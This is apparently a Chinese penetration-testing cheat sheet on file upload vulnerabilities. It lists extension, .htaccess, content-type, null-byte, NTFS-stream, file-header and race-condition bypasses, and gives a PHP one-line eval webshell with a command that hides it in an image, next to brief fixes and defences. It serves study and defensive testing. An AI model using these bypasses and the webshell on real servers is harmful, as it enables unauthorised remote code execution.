    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">描述：文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，</span><br><span class="line">html 存储型xss</span><br><span class="line">修复方案</span><br><span class="line">	在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问。</span><br><span class="line">	上传目录设置为禁止脚本文件执行</span><br><span class="line">	置上传白名单，白名单只允许图片上传</span><br><span class="line">	上传的后缀名，一定要设置成图片格式</span><br><span class="line">后缀</span><br><span class="line">	asp</span><br><span class="line">asa</span><br><span class="line">cdx</span><br><span class="line">	cer</span><br><span class="line">php</span><br><span class="line">aspx</span><br><span class="line">ashx</span><br><span class="line">jsp</span><br><span class="line">php3</span><br><span class="line">php.a</span><br><span class="line">shtml</span><br><span class="line">phtml</span><br><span class="line">有些网站会对asp或者php进行过滤转成空可用这些后缀名。</span><br><span class="line">aspaspasaspp</span><br><span class="line">phpphp</span><br><span class="line"></span><br><span class="line">绕过前端js检测上传</span><br><span class="line">	按F12使用网页审计元素，把校验的上传文件后缀名文件删除，即可上传。</span><br><span class="line">绕过contnet-type检测上传</span><br><span class="line">	image/jpeg</span><br><span class="line">绕过黑名单上传</span><br><span class="line">	可以上传asacercdx这些后缀</span><br><span class="line">	ashx代替aspx</span><br><span class="line">	phtml、php3均被解析成php有的apache版本默认就会开启</span><br><span class="line">htaccess重写解析绕过上传</span><br><span class="line">	在htaccess里写入SetHandlerapplication/x-httpd-php则可以文件重写成php文件</span><br><span class="line"></span><br><span class="line">	apache开启rewrite重写模块</span><br><span class="line"></span><br><span class="line">	&lt;FilesMatch&quot;jpg&quot;&gt;</span><br><span class="line">SetHandlerapplication/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">		访问图片即可获取执行脚本</span><br><span class="line">黑名单</span><br><span class="line">	array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line"></span><br><span class="line">大小写绕过上传</span><br><span class="line">空格绕过上传</span><br><span class="line">	文件后面php </span><br><span class="line">利用windows系统特征绕过上传</span><br><span class="line">	shell.php.</span><br><span class="line">NTFS交换数据流::$DATA绕过上传</span><br><span class="line">	修改后缀名为php::$DATA</span><br><span class="line">利用windows环境的叠加特征绕过上传攻击</span><br><span class="line">	a.php:.php上传会在目录里生成a.php空白文件，接着再次提交把a.php改成a.&gt;&gt;&gt; </span><br><span class="line">双写后缀名绕过上传</span><br><span class="line">	asaspp，pphphp</span><br><span class="line"></span><br><span class="line">目录可控%00截断绕过上传 白名单</span><br><span class="line"></span><br><span class="line">	php%00.1.jpg变成1.php</span><br><span class="line"></span><br><span class="line">目录可控POST绕过上传？</span><br><span class="line"></span><br><span class="line">	使用%00截断文件名再post环境下%00要经过decode但是受gpc限制</span><br><span class="line"></span><br><span class="line">文件头检测绕过上传</span><br><span class="line"></span><br><span class="line">	JPEG(jpg)，文件头：FFD8FF</span><br><span class="line">PNG(png)，文件头：89504E47</span><br><span class="line">GIF(gif)，文件头：47494638</span><br><span class="line">TIFF(tif)，文件头：49492A00</span><br><span class="line">WindowsBitmap(bmp)，文件头：424D</span><br><span class="line"></span><br><span class="line">	制作图片一句话，使用 &lt;?php @eval($_POST[&apos;密码&apos;]);?&gt; </span><br><span class="line">	copy 图片.jpg/b + 木马.php/a 合成.jpg</span><br><span class="line">	WinHex</span><br><span class="line"></span><br><span class="line">	burpsuite上传的数据包头加上GIF89a</span><br><span class="line"></span><br><span class="line">图片检测函数绕过上传</span><br><span class="line"></span><br><span class="line">绕过图片二次渲染上传</span><br><span class="line"></span><br><span class="line">	找相同处，覆盖字符串，填写一句话后门</span><br><span class="line"></span><br><span class="line">	通过对这两个文件进行对比</span><br><span class="line"></span><br><span class="line">文件上传条件竞争漏洞绕过</span><br><span class="line"></span><br><span class="line">	用move_uploaded_file把上传的临</span><br><span class="line">时文件移动到指定目录，接着再用rename文件设置为图片格式，如果在rename之前move_uploaded_file</span><br><span class="line">这个步骤如果这个文件可被客户端访问，这样我们也可以获取一个webshell。</span><br><span class="line"></span><br><span class="line">	&amp;a=1 1是变量 请求包 ，加 上传包  营造10000人访问1.php </span><br><span class="line">	防护手段</span><br><span class="line">对于文件上传类的条件竞争漏洞，一定要先充分检查之后再进行上传。</span><br><span class="line">而不是先上传，之后再检测。  </span><br><span class="line">逻辑漏洞条件竞争 拓展</span><br><span class="line">文件名控可控攻击方法</span><br><span class="line"></span><br><span class="line">数组绕过上传</span><br><span class="line"></span><br><span class="line">判断是否为黑白名单，如果是白名单寻找可控参数。如果是黑名单禁止上传，可以用有危害的后缀名批量提交测试，寻找遗留的执行脚本。</span><br><span class="line"></span><br><span class="line">防御方法</span><br><span class="line"></span><br><span class="line">	服务器端使用白名单防御，修复web中间件的漏洞，禁止客户端存在可控参数，存放文件目录禁止脚本执</span><br><span class="line">行，限制后缀名一定要设置图片格式jpg、gif、png文件名随机的，不可预测。</span><br><span class="line"></span><br><span class="line">	白名单  </span><br><span class="line">		目录可控，%00截断 </span><br><span class="line">		文件名截断</span><br><span class="line">		解析漏洞</span><br></pre></td></tr></table></figure>
